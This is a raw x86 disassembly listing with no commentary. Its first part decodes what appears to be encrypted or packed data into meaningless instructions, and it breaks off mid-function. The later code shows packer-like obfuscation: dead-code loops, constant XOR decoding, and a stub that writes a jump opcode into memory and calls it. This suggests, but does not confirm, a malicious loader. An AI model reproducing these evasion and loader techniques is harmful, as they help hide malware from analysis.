  422e9f:	(bad)  
  422ea0:	xor    BYTE PTR [edi-0x2e6e2793],0x16
  422ea7:	pop    ebx
  422ea8:	or     BYTE PTR [eax+0x54],dh
  422eab:	fnstcw WORD PTR [edx-0x45]
  422eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eaf:	mov    WORD PTR [edx-0x2f],cs
  422eb2:	sub    al,0x75
  422eb4:	adc    edx,DWORD PTR [ebx+0x60]
  422eb7:	mov    ebx,edi
  422eb9:	imul   ecx,DWORD PTR [esi],0xffffffc8
  422ebc:	mov    DWORD PTR [ebx],ebp
  422ebe:	mov    al,ds:0x3e834c8f
  422ec3:	mov    ds:0x6b545430,eax
  422ec8:	aaa    
  422ec9:	add    eax,0xae66d023
  422ece:	loopne 0x422ef0
  422ed0:	xchg   esp,eax
  422ed1:	jecxz  0x422ec7
  422ed3:	sbb    eax,0x3a84c63
  422ed8:	icebp  
  422ed9:	adc    BYTE PTR [ebp+0x52],bl
  422edc:	add    BYTE PTR [esi-0x3],ch
  422edf:	add    ebx,esp
  422ee1:	push   0xffffffc9
  422ee3:	jno    0x422f21
  422ee5:	(bad)  
  422ee6:	idiv   BYTE PTR [ebx+0x72dbb9cf]
  422eec:	ret    0x8fe9
  422eef:	stos   BYTE PTR es:[edi],al
  422ef0:	xor    ecx,DWORD PTR [ebp-0x73]
  422ef3:	out    dx,al
  422ef4:	jge    0x422ece
  422ef6:	xor    BYTE PTR [esi+0x69],bh
  422ef9:	push   edx
  422efa:	int    0x57
  422efc:	jmp    0x422f21
  422efe:	fs mov bl,0x64
  422f01:	inc    esi
  422f02:	inc    esp
  422f03:	arpl   bp,di
  422f05:	xchg   ecx,eax
  422f06:	fdivr  DWORD PTR [ecx-0x5b]
  422f09:	mov    al,ds:0xd7c7f6d7
  422f0e:	jmp    0xaa8d:0xe0a7d938
  422f15:	xchg   esp,eax
  422f16:	pushf  
  422f17:	(bad)  
  422f18:	aas    
  422f19:	push   esi
  422f1a:	jb     0x422ec7
  422f1c:	sub    BYTE PTR [ecx-0x7f],dl
  422f1f:	mov    WORD PTR [esi-0x47],ds
  422f22:	das    
  422f23:	and    al,0x33
  422f25:	in     eax,0xd1
  422f27:	fcomp  QWORD PTR [esi-0x65]
  422f2a:	xchg   ebx,eax
  422f2b:	retf   0xbf59
  422f2e:	retf   
  422f2f:	mov    esi,0xdf0324cc
  422f34:	adc    dl,ch
  422f36:	mov    fs,WORD PTR [ecx-0x2293daa3]
  422f3c:	inc    edi
  422f3d:	mov    eax,0xd3affa16
  422f42:	test   al,0xf7
  422f44:	in     eax,dx
  422f45:	mov    bh,0xf2
  422f47:	adc    esi,0xa2d99994
  422f4d:	pmullw mm2,QWORD PTR [esi+0x37]
  422f51:	pop    edx
  422f52:	or     edx,edx
  422f54:	jle    0x422f01
  422f56:	mov    eax,0x589a38b9
  422f5b:	dec    eax
  422f5c:	shl    BYTE PTR [edx],cl
  422f5e:	adc    eax,DWORD PTR [eax+0x3e7473c]
  422f64:	mov    ebp,0xe21de52
  422f69:	mov    al,ds:0x5aa532f7
  422f6e:	pop    esp
  422f6f:	inc    ebp
  422f70:	pop    edi
  422f71:	in     al,dx
  422f72:	cmp    dl,BYTE PTR ds:0x54f9be73
  422f78:	adc    bh,al
  422f7a:	xor    eax,0xdb584bf9
  422f7f:	cmp    eax,0xc5e3056f
  422f84:	push   DWORD PTR [eax-0x174466e3]
  422f8a:	xchg   ebp,eax
  422f8b:	mov    ecx,0x92e84b15
  422f90:	clc    
  422f91:	mov    esp,0x5c2c19c2
  422f96:	mov    dh,0x71
  422f98:	outs   dx,BYTE PTR ds:[esi]
  422f99:	push   eax
  422f9a:	sbb    dh,BYTE PTR [edx]
  422f9c:	add    DWORD PTR [eax-0xb2a7df0],esp
  422fa2:	shr    DWORD PTR [ecx+0x21],cl
  422fa5:	icebp  
  422fa6:	arpl   WORD PTR [edx+0x46],sp
  422fa9:	popa   
  422faa:	dec    esi
  422fab:	sub    edi,DWORD PTR [edx]
  422fad:	ret    
  422fae:	xor    DWORD PTR ds:0xdfcc088d,eax
  422fb4:	(bad)  
  422fb5:	cld    
  422fb6:	sub    DWORD PTR ds:0x4245,eax
  422fbb:	je     0x422ffd
  422fbd:	sahf   
  422fbe:	aad    0x57
  422fc0:	and    al,0x88
  422fc2:	(bad)  
  422fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fc4:	ds das 
  422fc6:	nop
  422fc7:	clc    
  422fc8:	mov    dl,0xba
  422fcb:	pop    edx
  422fcc:	addr16 sub eax,0xd90855cb
  422fd2:	mov    cl,0x7d
  422fd4:	or     BYTE PTR [ecx-0x4a98f7b8],ah
  422fda:	and    ecx,ecx
  422fdc:	sbb    bh,BYTE PTR [ebx-0x785eae0f]
  422fe2:	mov    ebp,0xe91a1599
  422fe7:	dec    ecx
  422fe8:	pop    edx
  422fe9:	jmp    0xe5b0b10d
  422fee:	and    BYTE PTR [esi+0x1074f5f3],dh
  422ff4:	jae    0x423044
  422ff6:	sbb    BYTE PTR [eax+0x11dced45],ch
  422ffc:	rcl    DWORD PTR [esi-0x65],0xee
  423000:	fiadd  WORD PTR [ebx]
  423002:	fcomp  QWORD PTR [edi+eax*1-0x5d130a49]
  423009:	pop    ecx
  42300a:	adc    eax,ecx
  42300c:	mov    cs,WORD PTR [ebx+eax*8+0x42]
  423010:	hlt    
  423011:	inc    edx
  423012:	push   ecx
  423013:	ss mov ebx,0xad5e2499
  423019:	mov    BYTE PTR [edi-0x75c1733b],bh
  42301f:	pop    ss
  423020:	std    
  423021:	jne    0x422fa9
  423023:	(bad)  
  423024:	ds pop eax
  423026:	pop    eax
  423027:	jecxz  0x423006
  423029:	imul   BYTE PTR [eax-0x1baa6320]
  42302f:	sbb    al,0x33
  423031:	fbld   TBYTE PTR [ebp-0x66]
  423034:	or     al,0x19
  423036:	sbb    al,0x44
  423038:	xor    esp,DWORD PTR [esi-0x59bc004e]
  42303e:	inc    esi
  42303f:	fidiv  WORD PTR [ecx+0x255d723c]
  423045:	stc    
  423046:	inc    eax
  423047:	ins    DWORD PTR es:[edi],dx
  423048:	mov    ds:0xf476d9b8,al
  42304d:	inc    ecx
  42304e:	int3   
  42304f:	inc    ecx
  423050:	out    0xea,al
  423052:	(bad)  
  423053:	dec    eax
  423054:	mov    bl,0xf9
  423056:	scas   al,BYTE PTR es:[edi]
  423057:	cs (bad) 
  423059:	addr16 adc al,0x72
  42305c:	adc    eax,0x3778bc8b
  423061:	mov    eax,ds:0x1f70bfc4
  423066:	out    0x54,al
  423068:	push   ds
  423069:	mov    ds:0xb553f2d7,al
  42306e:	xor    DWORD PTR [ebx+0x58],edi
  423071:	mov    ds:0x6bc6debb,eax
  423076:	setne  bh
  423079:	jae    0x42308b
  42307b:	sbb    DWORD PTR [ebx],esp
  42307d:	arpl   WORD PTR [edx+0x5731cef1],bx
  423083:	aas    
  423084:	and    eax,0x6fb94054
  423089:	mov    edi,0x98befac3
  42308e:	inc    ebp
  42308f:	(bad)  [edi-0x4ba74bad]
  423095:	pop    edi
  423096:	add    BYTE PTR [eax+0x53a70c5f],cl
  42309c:	cs inc esi
  42309e:	nop
  42309f:	(bad)  
  4230a0:	and    esp,DWORD PTR [edi]
  4230a2:	scas   al,BYTE PTR es:[edi]
  4230a3:	dec    ecx
  4230a4:	shl    BYTE PTR [ecx-0x7118135e],cl
  4230aa:	popa   
  4230ab:	add    BYTE PTR [ebp-0x705c1dce],cl
  4230b1:	(bad)  
  4230b2:	and    al,0x4f
  4230b4:	sub    ebp,ebp
  4230b6:	push   esp
  4230b7:	mov    cl,0xf5
  4230b9:	nop
  4230ba:	test   BYTE PTR [edx+0x6],0xc5
  4230be:	scas   al,BYTE PTR es:[edi]
  4230bf:	sahf   
  4230c0:	sub    ebx,DWORD PTR [ecx]
  4230c2:	pop    edi
  4230c3:	ins    DWORD PTR es:[edi],dx
  4230c4:	jbe    0x4230b3
  4230c6:	xor    BYTE PTR [ebx],al
  4230c8:	mov    edx,ebp
  4230ca:	and    eax,0xc593abc4
  4230cf:	outs   dx,DWORD PTR ds:[esi]
  4230d0:	pusha  
  4230d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230d2:	xor    edi,DWORD PTR [esi]
  4230d4:	mov    eax,0xff92daf8
  4230d9:	not    BYTE PTR [esi-0x49084678]
  4230df:	mov    ds,ecx
  4230e1:	or     BYTE PTR [edx+0x784178a6],bl
  4230e7:	inc    ecx
  4230e8:	cmp    eax,0x7ad29d3d
  4230ed:	ja     0x42315b
  4230ef:	cld    
  4230f0:	mov    cl,0xc3
  4230f3:	scas   al,BYTE PTR es:[edi]
  4230f4:	add    eax,0xc1670fed
  4230f9:	stos   DWORD PTR es:[edi],eax
  4230fa:	(bad)  
  4230fc:	aaa    
  4230fd:	pop    ebx
  4230fe:	mov    al,BYTE PTR [eax-0x750f30dd]
  423104:	ret    0x3aef
  423107:	cld    
  423108:	test   al,0x21
  42310a:	es inc ebp
  42310c:	pop    ss
  42310d:	dec    eax
  42310e:	pop    ebp
  42310f:	jno    0x423172
  423111:	mov    dh,0xb5
  423113:	xor    al,0x8d
  423115:	enter  0x8ef,0xc4
  423119:	stos   DWORD PTR es:[edi],eax
  42311a:	jp     0x42311f
  42311c:	iret   
  42311d:	and    ecx,edx
  42311f:	mov    DWORD PTR [ebp-0x4c],ecx
  423122:	mov    ecx,DWORD PTR [ebp+0x8]
  423125:	mov    edx,DWORD PTR [ebp-0x48]
  423128:	lea    ecx,[edx+ecx*1+0x241fcdf]
  42312f:	mov    DWORD PTR [ebp-0x48],ecx
  423132:	mov    ecx,DWORD PTR [ebp+0x8]
  423135:	mov    edx,0xfa5e1524
  42313a:	sub    edx,ecx
  42313c:	add    edx,DWORD PTR [ebp-0x44]
  42313f:	mov    DWORD PTR [ebp-0x44],edx
  423142:	mov    ecx,DWORD PTR [ebp+0x8]
  423145:	xor    ecx,eax
  423147:	add    ecx,esi
  423149:	jne    0x421ef2
  42314f:	mov    ecx,DWORD PTR [ebp-0x8]
  423152:	xor    ecx,eax
  423154:	mov    eax,DWORD PTR [ebp+0x10]
  423157:	add    ecx,esi
  423159:	mov    DWORD PTR [eax],ecx
  42315b:	pop    edi
  42315c:	pop    esi
  42315d:	pop    ebx
  42315e:	leave  
  42315f:	ret    0xc
  423162:	push   ebp
  423163:	mov    ebp,esp
  423165:	sub    esp,0x78
  423168:	and    DWORD PTR ds:0x42a2e2,0x0
  423172:	jmp    0x423184
  423177:	mov    ecx,DWORD PTR ds:0x42a2e2
  42317d:	inc    ecx
  42317e:	mov    DWORD PTR ds:0x42a2e2,ecx
  423184:	cmp    DWORD PTR ds:0x42a2e2,0x17
  42318b:	jae    0x4231d8
  423191:	cmp    DWORD PTR ds:0x42a2e2,0xb
  423198:	jbe    0x4231d8
  42319e:	jmp    0x4231b9
  4231a3:	push   DWORD PTR [ebp-0x14]
  4231a6:	push   0x42a2be
  4231ab:	push   0x8b21
  4231b0:	push   DWORD PTR [ebp-0x1c]
  4231b3:	call   DWORD PTR ds:0x42a3d2
  4231b9:	cmp    DWORD PTR ds:0x42a2e2,0xa
  4231c0:	jne    0x4231d3
  4231c6:	mov    ecx,DWORD PTR ds:0x42a2e2
  4231cc:	inc    ecx
  4231cd:	mov    DWORD PTR ds:0x42a2e2,ecx
  4231d3:	jmp    0x423177
  4231d8:	push   esi
  4231d9:	sbb    DWORD PTR ds:0x42a26e,edx
  4231df:	push   edi
  4231e0:	adc    esi,eax
  4231e2:	mov    eax,ds:0x42941e
  4231e7:	inc    DWORD PTR ds:0x42a2ae
  4231ed:	mov    DWORD PTR [ebp-0x24],eax
  4231f0:	mov    DWORD PTR ds:0x42a286,0x12e2
  4231fa:	mov    eax,ds:0x42953e
  4231ff:	inc    ecx
  423200:	mov    DWORD PTR [ebp-0x30],eax
  423203:	mov    DWORD PTR ds:0x42a29e,0x10
  42320d:	cmp    DWORD PTR ds:0x42a29e,0x0
  423214:	je     0x423276
  42321a:	cmp    DWORD PTR ds:0x42a29e,0x9
  423221:	jbe    0x423276
  423227:	jmp    0x42324b
  42322c:	push   DWORD PTR [ebp-0x24]
  42322f:	push   DWORD PTR [ebp-0x18]
  423232:	push   DWORD PTR [ebp-0xc]
  423235:	push   0x10f9
  42323a:	push   DWORD PTR [ebp-0x28]
  42323d:	push   DWORD PTR [ebp-0x18]
  423240:	push   0x429211
  423245:	call   DWORD PTR ds:0x42a3d6
  42324b:	cmp    DWORD PTR ds:0x42a29e,0xa
  423252:	jne    0x423266
  423258:	xor    eax,eax
  42325a:	xor    eax,DWORD PTR ds:0x42a29e
  423260:	dec    eax
  423261:	mov    ds:0x42a29e,eax
  423266:	mov    eax,ds:0x42a29e
  42326b:	dec    eax
  42326c:	mov    ds:0x42a29e,eax
  423271:	jmp    0x42320d
  423276:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  42327d:	mov    DWORD PTR ds:0x42a26a,0x16
  423287:	cmp    DWORD PTR ds:0x42a26a,0x0
  42328e:	je     0x4232c0
  423294:	cmp    DWORD PTR ds:0x42a26a,0x20
  42329b:	jg     0x4232c0
  4232a1:	jmp    0x4232ac
  4232a6:	call   DWORD PTR ds:0x42a3da
  4232ac:	xor    edi,edi
  4232ae:	add    edi,DWORD PTR ds:0x42a26a
  4232b4:	dec    edi
  4232b5:	mov    DWORD PTR ds:0x42a26a,edi
  4232bb:	jmp    0x423287
  4232c0:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  4232c7:	mov    eax,DWORD PTR [ebp-0x10]
  4232ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4232cd:	xor    esi,esi
  4232cf:	xor    esi,DWORD PTR ds:0x42a286
  4232d5:	xor    DWORD PTR ds:0x42a2f6,esi
  4232db:	sub    eax,ecx
  4232dd:	or     ecx,esi
  4232df:	mov    DWORD PTR [ebp-0x10],eax
  4232e2:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4232e9:	add    DWORD PTR ds:0x42a26a,0x2e29
  4232f3:	mov    eax,DWORD PTR [ebp-0x18]
  4232f6:	sbb    DWORD PTR ds:0x42a272,0x6ecf
  423300:	mov    ecx,DWORD PTR [ebp-0x18]
  423303:	add    DWORD PTR ds:0x42a256,0x42a29a
  42330d:	sub    eax,ecx
  42330f:	adc    DWORD PTR ds:0x42a302,edi
  423315:	mov    DWORD PTR [ebp-0x18],eax
  423318:	add    DWORD PTR ds:0x42a2fe,ecx
  42331e:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  423325:	adc    DWORD PTR ds:0x42a26a,0x287e
  42332f:	mov    eax,DWORD PTR [ebp-0xc]
  423332:	adc    esi,esi
  423334:	mov    ecx,DWORD PTR [ebp-0xc]
  423337:	sub    eax,ecx
  423339:	xor    DWORD PTR ds:0x42a2b6,0x51ed
  423343:	mov    DWORD PTR [ebp-0xc],eax
  423346:	and    DWORD PTR ds:0x42a2ae,0x0
  423350:	mov    edi,DWORD PTR ds:0x42a2ae
  423356:	inc    edi
  423357:	mov    DWORD PTR ds:0x42a2ae,edi
  42335d:	cmp    DWORD PTR ds:0x42a2ae,0xd
  423364:	ja     0x4233ae
  42336a:	jmp    0x423385
  42336f:	push   DWORD PTR [ebp-0x1c]
  423372:	push   0x7962
  423377:	push   0x7f76
  42337c:	push   DWORD PTR [ebp-0x20]
  42337f:	call   DWORD PTR ds:0x42a3de
  423385:	cmp    DWORD PTR ds:0x42a2ae,0xc
  42338c:	jne    0x4233a1
  423392:	xor    edi,edi
  423394:	xor    edi,DWORD PTR ds:0x42a2ae
  42339a:	inc    edi
  42339b:	mov    DWORD PTR ds:0x42a2ae,edi
  4233a1:	cmp    DWORD PTR ds:0x42a2ae,0x18
  4233a8:	jb     0x423350
  4233ae:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  4233b5:	adc    esi,edi
  4233b7:	mov    eax,DWORD PTR [ebp-0x1c]
  4233ba:	mov    ecx,DWORD PTR [ebp-0x1c]
  4233bd:	sub    eax,ecx
  4233bf:	mov    DWORD PTR [ebp-0x1c],eax
  4233c2:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  4233c9:	mov    eax,DWORD PTR [ebp-0x20]
  4233cc:	mov    ecx,DWORD PTR [ebp-0x20]
  4233cf:	sub    eax,ecx
  4233d1:	mov    DWORD PTR [ebp-0x20],eax
  4233d4:	mov    eax,DWORD PTR [ebp-0x2c]
  4233d7:	mov    ecx,DWORD PTR [ebp-0x20]
  4233da:	mov    esi,0x75108aa
  4233df:	xor    eax,esi
  4233e1:	mov    edi,0x3272f1
  4233e6:	add    eax,edi
  4233e8:	or     eax,ecx
  4233ea:	mov    DWORD PTR [ebp-0x20],eax
  4233ed:	mov    eax,DWORD PTR [ebp-0x4]
  4233f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4233f3:	sub    eax,ecx
  4233f5:	mov    DWORD PTR [ebp-0x4],eax
  4233f8:	or     DWORD PTR [ebp-0x4],0xf89c85be
  4233ff:	mov    eax,DWORD PTR [ebp-0xc]
  423402:	xor    eax,esi
  423404:	add    eax,edi
  423406:	push   eax
  423407:	mov    eax,DWORD PTR [ebp-0x10]
  42340a:	xor    eax,esi
  42340c:	add    eax,edi
  42340e:	push   eax
  42340f:	mov    eax,DWORD PTR [ebp-0x4]
  423412:	xor    eax,esi
  423414:	add    eax,edi
  423416:	push   eax
  423417:	lea    eax,[ebp-0x78]
  42341a:	push   eax
  42341b:	push   DWORD PTR [ebp-0x2c]
  42341e:	push   DWORD PTR [ebp-0x28]
  423421:	call   0x413da8
  423426:	test   eax,eax
  423428:	je     0x423456
  42342e:	lea    eax,[ebp-0x78]
  423431:	push   eax
  423432:	mov    eax,DWORD PTR [ebp-0x28]
  423435:	xor    eax,esi
  423437:	add    eax,edi
  423439:	push   eax
  42343a:	mov    eax,DWORD PTR [ebp-0x24]
  42343d:	add    eax,0xaa
  423442:	push   eax
  423443:	mov    eax,DWORD PTR [ebp-0x24]
  423446:	mov    eax,DWORD PTR [eax+0x198]
  42344c:	push   DWORD PTR [eax]
  42344e:	call   0x4084f6
  423453:	mov    DWORD PTR [ebp-0x14],eax
  423456:	mov    ecx,DWORD PTR ds:0x429516
  42345c:	lea    eax,[ebp+0x4]
  42345f:	mov    DWORD PTR [ecx*4+0x42950e],eax
  423466:	inc    DWORD PTR ds:0x429516
  42346c:	mov    eax,DWORD PTR [ebp-0x14]
  42346f:	test   eax,eax
  423471:	je     0x4234d9
  423477:	lea    eax,[ebp-0x8]
  42347a:	mov    DWORD PTR [ebp-0x34],eax
  42347d:	mov    eax,DWORD PTR [ebp-0x30]
  423480:	mov    DWORD PTR [ebp-0x8],eax
  423483:	mov    eax,DWORD PTR [ebp-0x8]
  423486:	mov    ecx,DWORD PTR [ebp-0x14]
  423489:	sub    eax,ecx
  42348b:	mov    DWORD PTR [ebp-0x8],eax
  42348e:	mov    ecx,DWORD PTR [ebp-0x4]
  423491:	xor    ecx,esi
  423493:	mov    eax,0xffcd8d0f
  423498:	sub    eax,ecx
  42349a:	add    DWORD PTR [ebp-0x8],eax
  42349d:	mov    eax,DWORD PTR [ebp-0x8]
  4234a0:	mov    ecx,DWORD PTR [ebp-0x14]
  4234a3:	mov    DWORD PTR [ecx+0x1],eax
  4234a6:	mov    eax,DWORD PTR [ebp-0x14]
  4234a9:	push   DWORD PTR [ebp-0x24]
  4234ac:	mov    BYTE PTR [eax],0xe9
  4234af:	mov    eax,ds:0x42929a
  4234b4:	push   DWORD PTR [eax]
  4234b6:	push   DWORD PTR ds:0x4294fe
  4234bc:	push   DWORD PTR ds:0x4292a2
  4234c2:	push   DWORD PTR ds:0x4294de
  4234c8:	push   DWORD PTR ds:0x42a04a
  4234ce:	push   DWORD PTR [ebp-0x28]
  4234d1:	push   DWORD PTR [ebp-0x2c]
  4234d4:	mov    eax,DWORD PTR [ebp-0x14]
  4234d7:	call   eax
  4234d9:	pop    edi
  4234da:	pop    esi
  4234db:	leave  
  4234dc:	ret    
  4234dd:	push   ebp
  4234de:	mov    ebp,esp
  4234e0:	sub    esp,0x1c
  4234e3:	mov    DWORD PTR ds:0x42a2ea,0x10
  4234ed:	cmp    DWORD PTR ds:0x42a2ea,0x0
  4234f4:	je     0x423524
  4234fa:	cmp    DWORD PTR ds:0x42a2ea,0x17
  423501:	jg     0x423524
  423507:	jmp    0x423512
  42350c:	call   DWORD PTR ds:0x42a3e2
  423512:	mov    ecx,DWORD PTR ds:0x42a2ea
  423518:	dec    ecx
  423519:	mov    DWORD PTR ds:0x42a2ea,ecx
  42351f:	jmp    0x4234ed
  423524:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  42352b:	sbb    ecx,ecx
  42352d:	lea    eax,[ebp+0x14]
  423530:	sub    edx,DWORD PTR ds:0x42a2da
  423536:	mov    DWORD PTR [ebp-0x4],eax
  423539:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  423540:	and    DWORD PTR ds:0x42a302,0x5581
  42354a:	lea    eax,[ebp-0xc]
  42354d:	and    DWORD PTR ds:0x42a256,0x0
  423557:	jmp    0x42356b
  42355c:	xor    ecx,ecx
  42355e:	or     ecx,DWORD PTR ds:0x42a256
  423564:	inc    ecx
  423565:	mov    DWORD PTR ds:0x42a256,ecx
  42356b:	cmp    DWORD PTR ds:0x42a256,0x1e
  423572:	jae    0x4235c3
  423578:	cmp    DWORD PTR ds:0x42a256,0x4
  42357f:	jg     0x4235c3
  423585:	jmp    0x4235a4
  42358a:	push   0x42a25a
  42358f:	push   0x6352
  423594:	push   0x429009
  423599:	push   0x42904c
  42359e:	call   DWORD PTR ds:0x42a3ea
  4235a4:	cmp    DWORD PTR ds:0x42a256,0x3
  4235ab:	jne    0x4235be
  4235b1:	mov    ecx,DWORD PTR ds:0x42a256
  4235b7:	inc    ecx
  4235b8:	mov    DWORD PTR ds:0x42a256,ecx
  4235be:	jmp    0x42355c
  4235c3:	mov    DWORD PTR [ebp-0x14],eax
  4235c6:	and    DWORD PTR ds:0x42a2f2,0x0
  4235d0:	jmp    0x4235e3
  4235d5:	xor    eax,eax
  4235d7:	add    eax,DWORD PTR ds:0x42a2f2
  4235dd:	inc    eax
  4235de:	mov    ds:0x42a2f2,eax
  4235e3:	cmp    DWORD PTR ds:0x42a2f2,0x16
  4235ea:	jae    0x42361c
  4235f0:	cmp    DWORD PTR ds:0x42a2f2,0x1d
  4235f7:	jbe    0x42361c
  4235fd:	jmp    0x423617
  423602:	push   0x76a3
  423607:	push   0x42a296
  42360c:	push   0x659d
  423611:	call   DWORD PTR ds:0x42a3ee
  423617:	jmp    0x4235d5
  42361c:	mov    eax,DWORD PTR [ebp-0xc]
  42361f:	mov    edx,DWORD PTR [ebp-0x14]
  423622:	neg    ecx
  423624:	mov    ecx,0x75108aa
  423629:	xor    eax,ecx
  42362b:	or     DWORD PTR ds:0x42a2c2,0x55df
  423635:	add    eax,0x3272f1
  42363a:	mov    DWORD PTR [edx],eax
  42363c:	xor    edx,edx
  42363e:	xor    edx,DWORD PTR ds:0x42a34a
  423644:	xor    eax,eax
  423646:	or     eax,DWORD PTR ds:0x42a35a
  42364c:	sub    edx,eax
  42364e:	sub    edx,DWORD PTR [edx+eax*1]
  423651:	mov    eax,ds:0x429296
  423656:	mov    DWORD PTR ds:0x42a2da,0x16
  423660:	cmp    DWORD PTR ds:0x42a2da,0x0
  423667:	je     0x42369f
  42366d:	cmp    DWORD PTR ds:0x42a2da,0x1d
  423674:	jge    0x42369f
  42367a:	jmp    0x42368d
  42367f:	push   DWORD PTR [ebp-0x20]
  423682:	push   0x42a2ca
  423687:	call   DWORD PTR ds:0x42a3f2
  42368d:	mov    edx,DWORD PTR ds:0x42a2da
  423693:	dec    edx
  423694:	mov    DWORD PTR ds:0x42a2da,edx
  42369a:	jmp    0x423660
  42369f:	mov    edx,DWORD PTR [ebp-0x4]
  4236a2:	adc    DWORD PTR ds:0x42a2be,0x42a256
  4236ac:	mov    eax,DWORD PTR [eax]
  4236ae:	and    DWORD PTR ds:0x42a286,0x12f2
  4236b8:	add    eax,DWORD PTR [edx]
  4236ba:	push   esi
  4236bb:	mov    DWORD PTR [ebp-0x8],eax
  4236be:	and    DWORD PTR ds:0x42a2f6,0x290a
  4236c8:	mov    edx,DWORD PTR [ebp+0x8]
  4236cb:	mov    eax,ds:0x42941e
  4236d0:	sbb    esi,0x612f
  4236d6:	mov    eax,DWORD PTR [eax+0x198]
  4236dc:	xor    edx,ecx
  4236de:	neg    esi
  4236e0:	mov    esi,0x3272f1
  4236e5:	add    edx,esi
  4236e7:	mov    DWORD PTR ds:0x42a2b6,0x4be9
  4236f1:	cmp    DWORD PTR [eax],edx
  4236f3:	je     0x423714
  4236f9:	mov    DWORD PTR ds:0x42a2ea,0x6dae
  423703:	mov    eax,DWORD PTR [eax]
  423705:	mov    DWORD PTR ds:0x42a2da,0x1950
  42370f:	jmp    0x423b57
  423714:	sbb    eax,DWORD PTR ds:0x42a296
  42371a:	mov    eax,DWORD PTR [ebp+0x18]
  42371d:	xor    eax,ecx
  42371f:	adc    DWORD PTR ds:0x42a2e6,0x42a2b2
  423729:	push   ebx
  42372a:	add    eax,esi
  42372c:	add    ebx,DWORD PTR ds:0x42a2a2
  423732:	xor    edx,edx
  423734:	mov    ebx,DWORD PTR ds:0x42a2c6
  42373a:	xor    DWORD PTR ds:0x42a2a2,ebx
  423740:	mov    ebx,0xfabdbed8
  423745:	adc    DWORD PTR ds:0x42a2ae,0x6fd6
  42374f:	add    eax,ebx
  423751:	mov    DWORD PTR ds:0x42a296,0x25f1
  42375b:	push   edi
  42375c:	mov    DWORD PTR ds:0x42a2be,0x342
  423766:	adc    edx,0xffffffff
  423769:	and    DWORD PTR ds:0x42a2ee,0x0
  423773:	jmp    0x423785
  423778:	mov    edi,DWORD PTR ds:0x42a2ee
  42377e:	inc    edi
  42377f:	mov    DWORD PTR ds:0x42a2ee,edi
  423785:	cmp    DWORD PTR ds:0x42a2ee,0x10
  42378c:	jae    0x4237ce
  423792:	cmp    DWORD PTR ds:0x42a2ee,0x6
  423799:	jbe    0x4237ce
  42379f:	jmp    0x4237af
  4237a4:	push   0x42a2fe
  4237a9:	call   DWORD PTR ds:0x42a3f6
  4237af:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4237b6:	jne    0x4237c9
  4237bc:	mov    edi,DWORD PTR ds:0x42a2ee
  4237c2:	inc    edi
  4237c3:	mov    DWORD PTR ds:0x42a2ee,edi
  4237c9:	jmp    0x423778
  4237ce:	mov    edi,0x8a29a13d
  4237d3:	mov    DWORD PTR ds:0x42a25e,0x2bce
  4237dd:	xor    eax,edi
  4237df:	sub    DWORD PTR ds:0x42a266,0x304b
  4237e9:	xor    edx,0x0
  4237ec:	mov    DWORD PTR ds:0x42a2b2,0x550
  4237f6:	cmp    eax,0x70941fe5
  4237fb:	mov    DWORD PTR ds:0x42a2c2,0x6d49
  423805:	jne    0x42383c
  42380b:	mov    DWORD PTR ds:0x42a2fa,0x2c4a
  423815:	cmp    edx,0xffffffff
  423818:	mov    DWORD PTR ds:0x42a2de,0x7cde
  423822:	jne    0x42383c
  423828:	push   0xf89c85ba
  42382d:	mov    DWORD PTR ds:0x42a2ca,0x25f0
  423837:	jmp    0x423b44
  42383c:	xor    DWORD PTR ds:0x42a2e2,edi
  423842:	mov    eax,DWORD PTR [ebp+0x18]
  423845:	and    DWORD PTR ds:0x42a25a,0x42a296
  42384f:	xor    eax,ecx
  423851:	add    eax,esi
  423853:	sub    DWORD PTR ds:0x42a292,0x6866
  42385d:	xor    edx,edx
  42385f:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  423869:	add    eax,ebx
  42386b:	mov    DWORD PTR ds:0x42a2f6,0x1dc4
  423875:	adc    edx,0xffffffff
  423878:	not    DWORD PTR ds:0x42a2ae
  42387e:	xor    eax,edi
  423880:	xor    edx,0x0
  423883:	cmp    eax,0x70941fe7
  423888:	jne    0x423b31
  42388e:	cmp    edx,0xffffffff
  423891:	jne    0x423b31
  423897:	mov    eax,DWORD PTR [ebp+0x10]
  42389a:	xor    eax,ecx
  42389c:	mov    DWORD PTR ds:0x42a2aa,0x16
  4238a6:	cmp    DWORD PTR ds:0x42a2aa,0x0
  4238ad:	je     0x4238ea
  4238b3:	cmp    DWORD PTR ds:0x42a2aa,0x25
  4238ba:	jbe    0x4238ea
  4238c0:	jmp    0x4238d8
  4238c5:	push   0x1425
  4238ca:	push   0x42a2b6
  4238cf:	push   DWORD PTR [ebp-0x14]
  4238d2:	call   DWORD PTR ds:0x42a3fa
  4238d8:	mov    edx,DWORD PTR ds:0x42a2aa
  4238de:	dec    edx
  4238df:	mov    DWORD PTR ds:0x42a2aa,edx
  4238e5:	jmp    0x4238a6
  4238ea:	add    eax,esi
  4238ec:	mov    edx,DWORD PTR ds:0x42a292
  4238f2:	sbb    edx,DWORD PTR ds:0x42a2de
  4238f8:	mov    DWORD PTR ds:0x42a292,edx
  4238fe:	mov    DWORD PTR [ebp-0x18],eax
  423901:	and    DWORD PTR ds:0x42a2b6,0x0
  42390b:	jmp    0x42391b
  423910:	mov    eax,ds:0x42a2b6
  423915:	inc    eax
  423916:	mov    ds:0x42a2b6,eax
  42391b:	cmp    DWORD PTR ds:0x42a2b6,0x13
  423922:	jae    0x423950
  423928:	cmp    DWORD PTR ds:0x42a2b6,0x17
  42392f:	ja     0x423950
  423935:	jmp    0x42394b
  42393a:	push   0x3d13
  42393f:	push   DWORD PTR [ebp-0x14]
  423942:	push   DWORD PTR [ebp-0x14]
  423945:	call   DWORD PTR ds:0x42a402
  42394b:	jmp    0x423910
  423950:	mov    eax,DWORD PTR [ebp+0xc]
